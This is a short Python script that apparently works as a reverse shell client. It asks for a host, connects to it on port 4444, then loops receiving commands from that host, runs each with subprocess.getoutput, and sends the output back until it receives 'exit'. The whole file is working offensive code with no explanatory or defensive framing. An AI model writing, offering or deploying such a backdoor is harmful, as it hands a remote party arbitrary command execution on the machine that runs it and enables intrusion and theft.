#!/usr/bin/python3
import socket
import subprocess

host = input("ENTER THE HOST:")
port = 4444
buffer_size = 1024

socket = socket.socket()

def connection():
	try:
		socket.connect((host, port))
		message = socket.recv(buffer_size).decode()
		print (message)
	except:
		exit()
connection()

def main():
	while True:
		command = socket.recv(buffer_size).decode()
		if command.lower() == "exit":
			break
		output = subprocess.getoutput(command)
		socket.send(output.encode())
	socket.close()
main()
